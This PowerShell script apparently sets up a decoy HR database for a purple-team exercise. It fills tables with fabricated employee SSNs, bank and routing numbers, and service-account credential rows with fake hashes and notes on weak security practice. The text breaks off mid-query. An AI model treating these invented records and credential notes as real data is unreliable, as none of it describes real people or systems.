$ErrorActionPreference = 'SilentlyContinue'

# ─── locate sqlcmd ────────────────────────────────────────────────────────────
$sqlcmd = if (Get-Command sqlcmd -EA 0) { "sqlcmd" } else {
    @(
        "${env:ProgramFiles}\Microsoft SQL Server\Client SDK\ODBC\170\Tools\Binn\sqlcmd.exe",
        "${env:ProgramFiles}\Microsoft SQL Server\Client SDK\ODBC\160\Tools\Binn\sqlcmd.exe",
        "${env:ProgramFiles}\Microsoft SQL Server\Client SDK\ODBC\130\Tools\Binn\sqlcmd.exe"
    ) | Where-Object { Test-Path $_ } | Select-Object -First 1
}
if (-not $sqlcmd) { Write-Host "[!] sqlcmd not found" -ForegroundColor Red; exit 1 }

function Invoke-Sql($q, [switch]$Silent) {
    $tmp = [IO.Path]::GetTempFileName() + ".sql"
    $q | Set-Content $tmp -Encoding UTF8
    $out = & $sqlcmd -S localhost -E -i $tmp -b 2>&1
    Remove-Item $tmp -EA 0
    if (-not $Silent) { $out | Where-Object { $_ -match '\S' } | ForEach-Object { Write-Host "  $_" } }
}

function Get-RowCount($db, $tbl) {
    $tmp = [IO.Path]::GetTempFileName() + ".sql"
    "USE $db; SELECT COUNT(*) FROM dbo.$tbl;" | Set-Content $tmp -Encoding UTF8
    $out = & $sqlcmd -S localhost -E -i $tmp -h -1 -b 2>&1 | Where-Object { $_ -match '^\s*\d+' } | Select-Object -First 1
    Remove-Item $tmp -EA 0
    return $out.Trim()
}

function Get-DbSizeMB($db) {
    $tmp = [IO.Path]::GetTempFileName() + ".sql"
    "USE $db; SELECT CAST(SUM(size * 8.0 / 1024) AS INT) FROM sys.database_files WHERE type_desc='ROWS';" |
        Set-Content $tmp -Encoding UTF8
    $out = & $sqlcmd -S localhost -E -i $tmp -h -1 -b 2>&1 | Where-Object { $_ -match '^\s*\d+' } | Select-Object -First 1
    Remove-Item $tmp -EA 0
    return $out.Trim()
}

Write-Host "================================================================" -ForegroundColor Cyan
Write-Host "  HR_Sensitive DB Setup — Purple Team Exercise" -ForegroundColor Cyan
Write-Host "  Target: ~5–7 GB across 8 tables" -ForegroundColor Cyan
Write-Host "================================================================" -ForegroundColor Cyan
Write-Host ""

# ─── DROP / CREATE ─────────────────────────────────────────────────────────────
Write-Host "[1/9] Creating database..." -ForegroundColor Cyan
Invoke-Sql -Silent @"
IF DB_ID('HR_Sensitive') IS NOT NULL
BEGIN
    ALTER DATABASE HR_Sensitive SET SINGLE_USER WITH ROLLBACK IMMEDIATE;
    DROP DATABASE HR_Sensitive;
END
GO
CREATE DATABASE HR_Sensitive;
ALTER DATABASE HR_Sensitive SET RECOVERY SIMPLE;
"@

# ─── SCHEMA ───────────────────────────────────────────────────────────────────
Write-Host "[2/9] Creating schema..." -ForegroundColor Cyan
Invoke-Sql -Silent @"
USE HR_Sensitive;

CREATE TABLE dbo.Employees (
    ID          INT IDENTITY(1,1) PRIMARY KEY,
    FullName    NVARCHAR(100)  NOT NULL,
    SSN         CHAR(11)       NOT NULL,
    Salary      INT            NOT NULL,
    Department  NVARCHAR(50)   NOT NULL,
    Email       NVARCHAR(100)  NOT NULL,
    HireDate    DATE           NOT NULL,
    Title       NVARCHAR(80)   NOT NULL,
    ManagerID   INT            NULL,
    IsActive    BIT            NOT NULL DEFAULT 1,
    HomeAddress NVARCHAR(200)  NOT NULL DEFAULT '',
    DOB         DATE           NULL,
    BankAccount NVARCHAR(30)   NOT NULL DEFAULT '',
    RoutingNo   NVARCHAR(20)   NOT NULL DEFAULT ''
);

CREATE TABLE dbo.Credentials (
    ID            INT IDENTITY(1,1) PRIMARY KEY,
    Service       NVARCHAR(80)   NOT NULL,
    Username      NVARCHAR(80)   NOT NULL,
    PasswordHash  NVARCHAR(200)  NOT NULL,
    LastRotated   DATE           NOT NULL,
    ExpiryDate    DATE           NULL,
    Notes         NVARCHAR(500)  NOT NULL
);

CREATE TABLE dbo.PayrollAudit (
    ID          INT IDENTITY(1,1) PRIMARY KEY,
    EmployeeID  INT            NOT NULL,
    AuditDate   DATE           NOT NULL,
    ChangedBy   NVARCHAR(80)   NOT NULL,
    OldSalary   INT            NOT NULL,
    NewSalary   INT            NOT NULL,
    Reason      NVARCHAR(200)  NOT NULL
);

CREATE TABLE dbo.EmailArchive (
    ID            BIGINT IDENTITY(1,1) PRIMARY KEY,
    Sender        NVARCHAR(120)  NOT NULL,
    Recipients    NVARCHAR(300)  NOT NULL,
    CC            NVARCHAR(300)  NOT NULL DEFAULT '',
    Subject       NVARCHAR(300)  NOT NULL,
    Body          NVARCHAR(MAX)  NOT NULL,
    SentAt        DATETIME       NOT NULL,
    HasAttachment BIT            NOT NULL DEFAULT 0,
    FolderPath    NVARCHAR(100)  NOT NULL DEFAULT 'Inbox',
    IsRead        BIT            NOT NULL DEFAULT 1,
    Importance    NVARCHAR(10)   NOT NULL DEFAULT 'Normal'
);

CREATE TABLE dbo.DocumentRepository (
    ID          BIGINT IDENTITY(1,1) PRIMARY KEY,
    FileName    NVARCHAR(200)  NOT NULL,
    FilePath    NVARCHAR(400)  NOT NULL,
    Owner       NVARCHAR(100)  NOT NULL,
    Department  NVARCHAR(50)   NOT NULL,
    Content     NVARCHAR(MAX)  NOT NULL,
    CreatedAt   DATETIME       NOT NULL,
    ModifiedAt  DATETIME       NOT NULL,
    SizeBytes   INT            NOT NULL,
    Sensitivity NVARCHAR(20)   NOT NULL DEFAULT 'Internal',
    Tags        NVARCHAR(200)  NOT NULL DEFAULT ''
);

CREATE TABLE dbo.SecurityEvents (
    ID          BIGINT IDENTITY(1,1) PRIMARY KEY,
    EventID     INT            NOT NULL,
    EventType   NVARCHAR(50)   NOT NULL,
    Source      NVARCHAR(80)   NOT NULL,
    Username    NVARCHAR(80)   NOT NULL,
    SourceIP    VARCHAR(45)    NOT NULL,
    TargetHost  NVARCHAR(80)   NOT NULL,
    Description NVARCHAR(300)  NOT NULL,
    Outcome     NVARCHAR(20)   NOT NULL,
    LoggedAt    DATETIME       NOT NULL
);

CREATE TABLE dbo.PayrollTransactions (
    ID              BIGINT IDENTITY(1,1) PRIMARY KEY,
    EmployeeID      INT            NOT NULL,
    PayPeriodStart  DATE           NOT NULL,
    PayPeriodEnd    DATE           NOT NULL,
    GrossPay        DECIMAL(10,2)  NOT NULL,
    FederalTax      DECIMAL(10,2)  NOT NULL,
    StateTax        DECIMAL(10,2)  NOT NULL,
    FICA            DECIMAL(10,2)  NOT NULL,
    NetPay          DECIMAL(10,2)  NOT NULL,
    BankAccount     NVARCHAR(30)   NOT NULL,
    RoutingNo       NVARCHAR(20)   NOT NULL,
    ProcessedAt     DATETIME       NOT NULL,
    Status          NVARCHAR(20)   NOT NULL DEFAULT 'Processed'
);

CREATE TABLE dbo.VPNSessions (
    ID          BIGINT IDENTITY(1,1) PRIMARY KEY,
    Username    NVARCHAR(80)   NOT NULL,
    SourceIP    VARCHAR(45)    NOT NULL,
    ConnectedAt DATETIME       NOT NULL,
    Duration    INT            NOT NULL,
    BytesIn     BIGINT         NOT NULL,
    BytesOut    BIGINT         NOT NULL,
    Tunnel      NVARCHAR(20)   NOT NULL,
    Device      NVARCHAR(80)   NOT NULL DEFAULT '',
    AuthMethod  NVARCHAR(30)   NOT NULL DEFAULT 'Password'
);
"@

# ─── EMPLOYEES (600 rows, PS-generated realistic data) ────────────────────────
Write-Host "[3/9] Populating Employees (600 rows)..." -ForegroundColor Cyan

$firstNames = @("James","Robert","Michael","William","David","Richard","Joseph","Thomas","Charles","Christopher",
    "Daniel","Matthew","Anthony","Mark","Donald","Steven","Paul","Andrew","Kenneth","Joshua","Kevin","Brian",
    "George","Timothy","Ronald","Edward","Jason","Jeffrey","Ryan","Jacob","Gary","Nicholas","Eric","Jonathan",
    "Mary","Patricia","Jennifer","Linda","Barbara","Susan","Jessica","Sarah","Karen","Lisa","Nancy","Betty",
    "Margaret","Sandra","Ashley","Emily","Dorothy","Donna","Carol","Ruth","Sharon","Michelle","Laura","Amanda",
    "Melissa","Rebecca","Deborah","Rachel","Stephanie","Carolyn","Christine","Marie","Janet","Catherine","Frances",
    "Ann","Joyce","Diana","Alice","Julie","Heather","Teresa","Doris","Gloria","Evelyn","Jean","Cheryl","Mildred",
    "Katherine","Joan","Ashley","Judith","Rose","Janice","Kelly","Nicole","Judy","Christina","Kathy","Theresa")

$lastNames = @("Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis","Rodriguez","Martinez",
    "Hernandez","Lopez","Gonzalez","Wilson","Anderson","Thomas","Taylor","Moore","Jackson","Martin","Lee",
    "Perez","Thompson","White","Harris","Sanchez","Clark","Ramirez","Lewis","Robinson","Walker","Young",
    "Allen","King","Wright","Scott","Torres","Nguyen","Hill","Flores","Green","Adams","Nelson","Baker",
    "Hall","Rivera","Campbell","Mitchell","Carter","Roberts","Turner","Phillips","Evans","Collins","Stewart",
    "Morris","Morales","Murphy","Cook","Rogers","Gutierrez","Ortiz","Morgan","Cooper","Peterson","Bailey",
    "Reed","Kelly","Howard","Ramos","Kim","Cox","Ward","Richardson","Watson","Brooks","Chavez","Wood",
    "James","Bennett","Gray","Mendoza","Ruiz","Hughes","Price","Alvarez","Castillo","Sanders","Patel")

$departments = @("HR","Finance","IT","Legal","Executive","Sales","Engineering","Operations","Marketing","Security")

$titles = @{
    HR          = @("HR Generalist","HR Manager","Recruiter","Compensation Analyst","Benefits Coordinator","HRIS Specialist","HR Director","Talent Acquisition Lead","People Operations Manager","HR Business Partner")
    Finance     = @("Financial Analyst","Controller","Staff Accountant","Payroll Manager","Treasury Analyst","CFO","Accounts Payable Specialist","Budget Analyst","Senior Accountant","Finance Director")
    IT          = @("Systems Administrator","Network Engineer","Security Analyst","Help Desk Technician","DevOps Engineer","IT Manager","Database Administrator","Cloud Architect","Infrastructure Lead","IT Director")
    Legal       = @("Corporate Counsel","Paralegal","Compliance Officer","Contract Manager","Legal Assistant","General Counsel","Privacy Officer","Risk Analyst","Associate Counsel","Legal Operations Manager")
    Executive   = @("CEO","COO","CTO","VP of Operations","Chief of Staff","VP of Finance","Director of Strategy","EVP","President","Managing Director")
    Sales       = @("Account Executive","Sales Manager","Business Development Rep","Regional Director","Inside Sales Rep","VP of Sales","Sales Engineer","Channel Manager","Sales Operations Analyst","Enterprise Account Manager")
    Engineering = @("Software Engineer","Senior Engineer","Principal Engineer","Engineering Manager","QA Engineer","Data Engineer","Platform Engineer","VP of Engineering","Staff Engineer","Tech Lead")
    Operations  = @("Operations Manager","Process Analyst","Supply Chain Coordinator","Facilities Manager","Operations Director","Logistics Analyst","Business Analyst","Program Manager","Ops Specialist","PMO Lead")
    Marketing   = @("Marketing Manager","Content Strategist","SEO Analyst","Brand Manager","Campaign Manager","Digital Marketing Specialist","VP of Marketing","Product Marketing Manager","Demand Gen Manager","CMO")
    Security    = @("Security Engineer","Penetration Tester","SOC Analyst","CISO","Incident Responder","Threat Intelligence Analyst","Security Architect","GRC Analyst","Red Team Lead","Detection Engineer")
}

$streets  = @("Main St","Oak Ave","Maple Dr","Cedar Ln","Elm St","Park Blvd","Washington Ave","Lake Dr","Ridge Rd","River Rd","Forest Way","Valley Rd","Hill St","Sunset Blvd","Lincoln Ave")
$cities   = @("Austin,TX","Seattle,WA","Denver,CO","Chicago,IL","Atlanta,GA","Phoenix,AZ","Boston,MA","Miami,FL","Portland,OR","Nashville,TN","Dallas,TX","San Diego,CA","Minneapolis,MN","Charlotte,NC","Indianapolis,IN")
$banks    = @("Chase","BofA","Wells Fargo","Citibank","TD Bank","US Bank","PNC","Truist","Capital One","Regions")

$usedKeys = @{}; $employees = @()

for ($i = 0; $i -lt 600; $i++) {
    do {
        $fn = $firstNames[(Get-Random -Max $firstNames.Count)]
        $ln = $lastNames[(Get-Random -Max $lastNames.Count)]
    } while ($usedKeys.ContainsKey("$fn$ln"))
    $usedKeys["$fn$ln"] = $true

    $dept   = $departments[$i % $departments.Count]
    $title  = ($titles[$dept])[(Get-Random -Max ($titles[$dept]).Count)]
    $salary = switch -Regex ($title) {
        "CEO|CFO|CTO|COO|CISO|VP |Chief|EVP|President|Managing|General Counsel" { Get-Random -Min 195000 -Max 420000 }
        "Director|Principal|Staff |Lead|Manager|Architect"                       { Get-Random -Min 115000 -Max 210000 }
        default                                                                   { Get-Random -Min 48000  -Max 118000 }
    }
    $email  = "$($fn.ToLower()).$($ln.ToLower())@contoso.com"
    $ssn    = "$(Get-Random -Min 400 -Max 599)-$('{0:D2}' -f (Get-Random -Min 10 -Max 99))-$('{0:D4}' -f (Get-Random -Min 1000 -Max 9999))"
    $dob    = "$(Get-Random -Min 1960 -Max 2000)-$('{0:D2}' -f (Get-Random -Min 1 -Max 13))-$('{0:D2}' -f (Get-Random -Min 1 -Max 29))"
    $hire   = "$(Get-Random -Min 2009 -Max 2025)-$('{0:D2}' -f (Get-Random -Min 1 -Max 13))-$('{0:D2}' -f (Get-Random -Min 1 -Max 29))"
    $addr   = "$(Get-Random -Min 100 -Max 9999) $($streets[(Get-Random -Max $streets.Count)]), $($cities[(Get-Random -Max $cities.Count)]) $('{0:D5}' -f (Get-Random -Min 10000 -Max 99999))"
    $acct   = "$(Get-Random -Min 1000000000 -Max 9999999999)"
    $route  = "0$(Get-Random -Min 21000000 -Max 99999999)0"
    $employees += "('$fn $ln','$ssn',$salary,'$dept','$email','$hire','$title',NULL,1,'$addr','$dob','$acct','$route')"
}

for ($b = 0; $b -lt $employees.Count; $b += 50) {
    $batch = $employees[$b..([Math]::Min($b + 49, $employees.Count - 1))]
    Invoke-Sql -Silent "USE HR_Sensitive; INSERT INTO dbo.Employees (FullName,SSN,Salary,Department,Email,HireDate,Title,ManagerID,IsActive,HomeAddress,DOB,BankAccount,RoutingNo) VALUES $($batch -join ',');"
}

# ─── CREDENTIALS (25 rows) ────────────────────────────────────────────────────
Write-Host "[4/9] Populating Credentials (25 rows)..." -ForegroundColor Cyan

Invoke-Sql -Silent @"
USE HR_Sensitive;
INSERT INTO dbo.Credentials (Service,Username,PasswordHash,LastRotated,ExpiryDate,Notes) VALUES
('SQL Server SA',          'sa',               N'`$2b`$12`$Kx8WqI3mNpLvT6yR9aD4OuFjZnHsUeYcBdMwQgPiAkXoElCvRtJb', '2024-01-15','2024-07-15','Primary SA account. Enabled for break-glass only.'),
('SQL Server SA (backup)', 'sa_backup',        N'`$2b`$12`$mN7pQr2sKvXwL5yT8aB3OuEiZnGrUdYcCeMwRfPjAlDoFhCtSbJk', '2023-11-20','2024-05-20','Backup SA - stored in CyberArk vault.'),
('VPN Gateway',            'vpnadmin',         N'`$2b`$12`$Lp9nRs4tMwYxO6zU1bC7QvHkAoFiVeZdDeNxSgQhBjElCrPuTmKw', '2024-02-01','2024-08-01','Palo Alto GlobalProtect admin. Shared with NOC.'),
('VPN Service Account',    'svc_vpn',          N'`$2b`$12`$Jq8oSt5uNxZyP7aV2cD8RwIlBpGjWfAeEoOySfRiCkFmDtQuUvLx', '2023-09-10','2024-03-10','Service account for VPN radius auth. Never rotated - legacy app dependency.'),
('RDP Admin',              'rdpadmin',         N'`$2b`$12`$Hr7nTu6vOyAzQ8bW3dE9SxJmCqHkXgBfFpPzTgSjDlGnEuRvVwMy', '2024-03-22','2024-09-22','Local admin on all servers. GPO-managed.'),
('Azure AD Sync',          'svc_aadsync',      N'`$2b`$12`$Gq6mUv7wPzBaR9cX4eF0TyKnDrIlYhCgGqQaUhTkEmHoFvSwXnNz', '2024-01-08','2024-07-08','AAD Connect service account. Directory sync every 30 min.'),
('Exchange Admin',         'exadmin',          N'`$2b`$12`$Fp5lVw8xQaCbS0dY5fG1UzLoDsJmZiDhHrRbViUjFnIpGwTxYoOa', '2023-12-05','2024-06-05','Exchange Online hybrid admin. MFA exempt - ticket INC0049231.'),
('SharePoint Farm',        'svc_sharepoint',   N'`$2b`$12`$Eo4kWx9yRbDcT1eZ6gH2VaMpEtKnAjEiIsScWjVkGoJqHxUyZpPb', '2023-10-18','2024-04-18','SharePoint farm svc account. All WFE/APP servers.'),
('Backup Exec',            'svc_backupexec',   N'`$2b`$12`$Dn3jXy0zScEdU2fA7hI3WbNqFuLoeBkFJtTdXkWlHpKrIyVzAqQc', '2024-04-11','2024-10-11','Has local admin on all nodes.'),
('Veeam Backup',           'svc_veeam',        N'`$2b`$12`$Cm2iYz1aUdFeV3gB8iJ4XcOrGvMpfClGKuUeYlXmIqLsJzWaBrDd', '2024-02-28','2024-08-28','Backup repo creds stored in Veeam DB.'),
('SCCM/ConfigMgr',         'svc_sccm',         N'`$2b`$12`$Bl1hZa2bVeGfW4hC9jK5YdPsHwNqgDmHLvVfZmYnJrMtKaXbCsEe', '2023-08-14','2024-02-14','NAA account. Used for software deployment across domain.'),
('Splunk',                 'splunkadmin',      N'`$2b`$12`$Ak0gAb3cWfHgX5iD0kL6ZeQtIxOrHenIMwWgAnZoKsNuLbYcDtFf', '2024-05-01','2024-11-01','Indexes all syslog, WinEvent, IDS.'),
('Domain Admin (break)',   'da_breakglass',    N'`$2b`$12`$Zj9fBc4dXgIhY6jE1lM7AfRuJyPsIfpJNxXhBoApLtOvMcZdEuGg', '2024-01-01','2024-07-01','Break-glass DA. Password in physical safe room 204.'),
('WSUS',                   'svc_wsus',         N'`$2b`$12`$Yi8eCd5eYhJiZ7kF2mN8BgSvKzQtJgqKOyYiCpBqMuPnNdAeFvHh', '2023-07-22','2024-01-22','Auto-approve all policy - no change control.'),
('Zabbix Monitoring',      'zabbix',           N'`$2b`$12`$Xh7dDe6fZiKjA8lG3nO9ChTwLaRuKfrLPzZjDqCrNvOoOeZfGwIi', '2024-03-15','2024-09-15','Has SNMP read creds for all network devices.'),
('pfSense Firewall',       'pfadmin',          N'`$2b`$12`$Wg6cEf7gAjLkB9mH4oP0DiUxMbSvLesLQaAkErDsOwNpPfAgHxJj', '2024-06-01','2024-12-01','2FA disabled for NMS compatibility.'),
('IIS App Pool',           'svc_iis',          N'`$2b`$12`$Vf5bFg8hBkMlC0nI5pQ1EjVyNcTwMftMRbBlFsEtPxMqQgBhIyKk', '2023-11-30','2024-05-30','Write access to D:\Inetpub.'),
('vCenter',                'vcadmin',          N'`$2b`$12`$Ue4aGh9iClNmD1oJ6qR2FkWzOdUxNguNScCmGtFuQyLrRhCiJzLl', '2024-04-20','2024-10-20','Manages 14 ESXi hosts.'),
('CyberArk',               'cyberark_admin',   N'`$2b`$12`$Td3aHi0jDmOnE2pK7rS3GlXaPeVyOhvOTdDnHuGvRzMsShDjKaAm', '2024-02-10','2024-08-10','Vault admin. Handles PAM for 300+ accounts.'),
('ServiceNow',             'svc_snow',         N'`$2b`$12`$Sc2aIj1kEnPpF3qL8sT4HmYbQfWzPiwPUeEoIvHwSaRtTiEkLbBn', '2023-09-05','2024-03-05','CMDB sync and incident automation.'),
('GitHub Enterprise',      'svc_github',       N'`$2b`$12`$Rb1aJk2lFoQqG4rM9tU5InZcRgXaQjxQVfFpJwIxTbSuUjFlMcCo', '2024-01-25','2024-07-25','Repo admin on all org repos. Used by all CI/CD pipelines.'),
('Qualys Scanner',         'qualys_svc',       N'`$2b`$12`$Qa0aKl3mGpRrH5sN0uV6JoAdShYbRkyRWgGqKxJyUcTvVkGmNdDp', '2024-05-15','2024-11-15','Domain read + local admin via GPO.'),
('HashiCorp Vault',        'vault_root',       N'`$2b`$12`$Pz9aLm4nHqSsI6tO1vW7KpBeThZcSlzSXhHrLyKzVdUwWlHnOeEq', '2024-03-01','2024-09-01','Root token. Air-gapped. Last used: DR drill 2024-03-01.'),
('Okta Admin',             'okta_superadmin',  N'`$2b`$12`$Oy8aJk5oIrTtJ7uP2wX8LqCfUiAdTmazTiIsMyLaWeVxXmIoFfFr', '2024-04-05','2024-10-05','Controls MFA policies for entire org.'),
('Ansible Tower',          'svc_ansible',      N'`$2b`$12`$Nx7aKl6pJsUuK8vQ3xY9MrDgVjBeUnaUUjJtNzMbXfWyYnJpGgGs', '2023-12-20','2024-06-20','SSH key access to all Linux servers.');
"@

# ─── EMAIL ARCHIVE (~3.5 GB, server-side generation) ─────────────────────────
Write-Host "[5/9] Generating EmailArchive (~400k rows, ~3.5 GB) — this takes a few minutes..." -ForegroundColor Cyan

Invoke-Sql -Silent @"
USE HR_Sensitive;
SET NOCOUNT ON;

DECLARE @subjects TABLE (s NVARCHAR(200));
INSERT @subjects VALUES
  ('Re: Q3 budget review - action items'),('Fwd: Acquisition target NDA - CONFIDENTIAL'),
  ('Re: Board presentation - final draft'),('Salary band adjustments FY2024 - DO NOT FORWARD'),
  ('Re: Security audit findings - remediation plan'),('M&A due diligence - Project Falcon'),
  ('Re: Reduction in force planning - HR ONLY'),('Fwd: Vendor contract - renewal terms'),
  ('Re: Executive compensation benchmarking'),('System access request - requires VP approval'),
  ('Re: Annual performance review calibration'),('Fwd: Legal hold notice - all IT staff'),
  ('Re: Data breach notification draft - attorney client privilege'),('Q4 headcount plan - DRAFT'),
  ('Re: Infrastructure migration costs - budget impact');

DECLARE @depts  TABLE (d NVARCHAR(50));
INSERT @depts VALUES ('HR'),('Finance'),('IT'),('Legal'),('Executive'),('Sales'),('Engineering'),('Operations'),('Marketing'),('Security');

DECLARE @bodies TABLE (b NVARCHAR(MAX));
INSERT @bodies VALUES
(N'Hi team, following up on our discussion from yesterday''s meeting. Please review the attached documents and provide your feedback by EOD Friday. Key action items: (1) Review compensation band analysis, (2) Confirm headcount approvals, (3) Sign off on the Q3 adjustments. Note that this information is strictly confidential and should not be shared outside this distribution list. The HR team will schedule individual follow-ups next week. Best regards.'),
(N'Per our conversation, please find the details below. The audit identified several control gaps that require immediate remediation. Priority 1 items must be addressed within 30 days. I have attached the full findings report along with suggested remediation steps. Please coordinate with your respective team leads and provide status updates by the 15th. Escalate any blockers to the CISO. This is a formal finding and will be tracked in GRC until closure.'),
(N'Attached is the revised proposal incorporating all feedback from last week''s review session. Legal has signed off on sections 3 and 7. Finance needs to approve the budget line items before we can proceed. Please note the updated terms in section 4.2 regarding data handling and retention. The vendor has agreed to our SLA requirements but is requesting a 90-day implementation window. We need a decision by end of month to hold the pricing. Awaiting your sign-off.'),
(N'This is a reminder that all access credentials for the legacy system must be rotated before the migration cutover. The svc_legacy account password is stored in the shared IT vault (see attached password sheet - CONFIDENTIAL). Please do not email these credentials to anyone outside the IT security team. If you need access for the migration tasks, submit a ticket to the help desk referencing project MIGRATE-2024. All actions will be logged and audited.'),
(N'Following the Q3 earnings call, leadership has requested a comprehensive review of all vendor contracts over $500k. Please pull the current contract register and identify any renewals coming up in the next 6 months. Pay particular attention to the contracts with preferred pricing clauses - those need renegotiation before the CPI adjustment kicks in. Finance will need the final numbers by the 20th for the board deck. This is time sensitive.');

DECLARE @batch INT = 0;
DECLARE @batchSize INT = 10000;
DECLARE @total INT = 400000;

WHILE @batch < @total
BEGIN
    INSERT INTO dbo.EmailArchive (Sender, Recipients, CC, Subject, Body, SentAt, HasAttachment, FolderPath, IsRead, Importance)
    SELECT TOP (@batchSize)
        'user' + CAST(ABS(CHECKSUM(NEWID())) % 600 + 1 AS NVARCHAR) + '@contoso.com',
        'team' + CAST(ABS(CHECKSUM(NEWID())) % 50 + 1 AS NVARCHAR) + '@contoso.com; manager' + CAST(ABS(CHECKSUM(NEWID())) % 20 AS NVARCHAR) + '@contoso.com',
        CASE WHEN ABS(CHECKSUM(NEWID())) % 3 = 0 THEN 'leadership@contoso.com' ELSE '' END,
        (SELECT TOP 1 s FROM @subjects ORDER BY NEWID()),
        CAST((SELECT TOP 1 b FROM @bodies ORDER BY NEWID()) AS NVARCHAR(MAX))
            + REPLICATE(CAST(' Additional context and discussion thread follows. Previous message content has been preserved for audit purposes. This communication may contain privileged or confidential information.' AS NVARCHAR(MAX)), 18),
        DATEADD(MINUTE, -(ABS(CHECKSUM(NEWID())) % 1051200), GETDATE()),
        CASE WHEN ABS(CHECKSUM(NEWID())) % 4 = 0 THEN 1 ELSE 0 END,
        CASE ABS(CHECKSUM(NEWID())) % 4 WHEN 0 THEN 'Sent' WHEN 1 THEN 'Archive' WHEN 2 THEN 'HR-Confidential' ELSE 'Inbox' END,
        CASE WHEN ABS(CHECKSUM(NEWID())) % 5 = 0 THEN 0 ELSE 1 END,
        CASE ABS(CHECKSUM(NEWID())) % 5 WHEN 0 THEN 'High' ELSE 'Normal' END
    FROM master..spt_values a CROSS JOIN master..spt_values b;

    SET @batch = @batch + @batchSize;
    DECLARE @pct INT = @batch * 100 / @total;
    RAISERROR('  EmailArchive: %d%% (%d / %d rows)', 0, 1, @pct, @batch, @total) WITH NOWAIT;
END
"@

# ─── DOCUMENT REPOSITORY (~1.5 GB) ────────────────────────────────────────────
Write-Host "[6/9] Generating DocumentRepository (~60k rows, ~1.5 GB)..." -ForegroundColor Cyan

Invoke-Sql -Silent @"
USE HR_Sensitive;
SET NOCOUNT ON;

DECLARE @fnames TABLE (f NVARCHAR(100));
INSERT @fnames VALUES
  ('Employee_Compensation_Report_FY2024.xlsx'),('Board_Presentation_Q3_Final.pptx'),
  ('Vendor_Contract_Renewal_2024.docx'),('Security_Audit_Findings_CONFIDENTIAL.pdf'),
  ('Acquisition_Due_Diligence_ProjectFalcon.docx'),('Payroll_Summary_October2024.xlsx'),
  ('HR_Headcount_Plan_Q4.xlsx'),('IT_Infrastructure_Migration_Plan.docx'),
  ('Legal_Hold_Notice_2024.pdf'),('Access_Review_Q3_Results.xlsx'),
  ('RIF_Planning_Document_DRAFT.docx'),('Executive_Compensation_Benchmarking.pdf'),
  ('Data_Breach_Response_Plan.docx'),('Penetration_Test_Report_2024.pdf'),
  ('Employee_Performance_Calibration.xlsx');

DECLARE @content NVARCHAR(MAX) = REPLICATE(CAST(
  N'CONFIDENTIAL — FOR INTERNAL USE ONLY. This document contains sensitive business information including financial data, personnel records, and strategic plans. Unauthorized disclosure is prohibited and may result in disciplinary action. Document classification: RESTRICTED. Retention period: 7 years per records management policy RM-2019-003. If you received this in error please notify the records management team immediately and destroy all copies. '
AS NVARCHAR(MAX)), 60);

INSERT INTO dbo.DocumentRepository (FileName, FilePath, Owner, Department, Content, CreatedAt, ModifiedAt, SizeBytes, Sensitivity, Tags)
SELECT TOP 60000
    (SELECT TOP 1 f FROM @fnames ORDER BY NEWID()),
    '\\fileserver01\' + d.dept + '\' + CAST(YEAR(GETDATE()) AS NVARCHAR) + '\' + (SELECT TOP 1 f FROM @fnames ORDER BY NEWID()),
    'user' + CAST(ABS(CHECKSUM(NEWID())) % 600 + 1 AS NVARCHAR) + '@contoso.com',
    d.dept,
    @content,
    DATEADD(DAY, -(ABS(CHECKSUM(NEWID())) % 730), GETDATE()),
    DATEADD(DAY, -(ABS(CHECKSUM(NEWID())) % 30), GETDATE()),
    ABS(CHECKSUM(NEWID())) % 20971520 + 10240,
    CASE ABS(CHECKSUM(NEWID())) % 4 WHEN 0 THEN 'Confidential' WHEN 1 THEN 'Restricted' WHEN 2 THEN 'Internal' ELSE 'Public' END,
    CASE ABS(CHECKSUM(NEWID())) % 3 WHEN 0 THEN 'finance,audit' WHEN 1 THEN 'hr,personnel' ELSE 'legal,compliance' END
FROM master..spt_values a CROSS JOIN master..spt_values b
CROSS JOIN (SELECT 'HR' dept UNION SELECT 'Finance' UNION SELECT 'IT' UNION SELECT 'Legal' UNION SELECT 'Executive') d;
"@

# ─── SECURITY EVENTS (~1 million rows, ~400 MB) ───────────────────────────────
Write-Host "[7/9] Generating SecurityEvents (~1M rows, ~400 MB)..." -ForegroundColor Cyan

Invoke-Sql -Silent @"
USE HR_Sensitive;
SET NOCOUNT ON;

DECLARE @batch INT = 0;
DECLARE @batchSize INT = 50000;
DECLARE @total INT = 1000000;

WHILE @batch < @total
BEGIN
    INSERT INTO dbo.SecurityEvents (EventID, EventType, Source, Username, SourceIP, TargetHost, Description, Outcome, LoggedAt)
    SELECT TOP (@batchSize)
        CASE ABS(CHECKSUM(NEWID())) % 8
            WHEN 0 THEN 4624 WHEN 1 THEN 4625 WHEN 2 THEN 4648 WHEN 3 THEN 4768
            WHEN 4 THEN 4776 WHEN 5 THEN 5140 WHEN 6 THEN 7045 ELSE 4720 END,
        CASE ABS(CHECKSUM(NEWID())) % 6
            WHEN 0 THEN 'Logon' WHEN 1 THEN 'Logon Failure' WHEN 2 THEN 'Explicit Logon'
            WHEN 3 THEN 'Kerberos Auth' WHEN 4 THEN 'Network Share' ELSE 'Service Install' END,
        CASE ABS(CHECKSUM(NEWID())) % 4
            WHEN 0 THEN 'DC-01' WHEN 1 THEN 'DC-02' WHEN 2 THEN 'DB-Server-02' ELSE 'APP-Server-01' END,
        'user' + CAST(ABS(CHECKSUM(NEWID())) % 600 + 1 AS NVARCHAR),
        CAST(CAST(ABS(CHECKSUM(NEWID())) % 192 + 10 AS NVARCHAR) + '.' +
             CAST(ABS(CHECKSUM(NEWID())) % 256 AS NVARCHAR) + '.' +
             CAST(ABS(CHECKSUM(NEWID())) % 256 AS NVARCHAR) + '.' +
             CAST(ABS(CHECKSUM(NEWID())) % 254 + 1 AS NVARCHAR) AS VARCHAR(45)),
        CASE ABS(CHECKSUM(NEWID())) % 5
            WHEN 0 THEN 'DB-Server-02' WHEN 1 THEN 'DC-01' WHEN 2 THEN 'FileServer-01'
            WHEN 3 THEN 'APP-Server-01' ELSE 'WORKSTATION-' + CAST(ABS(CHECKSUM(NEWID())) % 200 + 1 AS NVARCHAR) END,
        CASE ABS(CHECKSUM(NEWID())) % 4
            WHEN 0 THEN 'An account was successfully logged on'
            WHEN 1 THEN 'An account failed to log on - invalid credentials'
            WHEN 2 THEN 'A logon was attempted using explicit credentials'
            ELSE 'A network share object was accessed' END,
        CASE WHEN ABS(CHECKSUM(NEWID())) % 10 = 0 THEN 'Failure' ELSE 'Success' END,
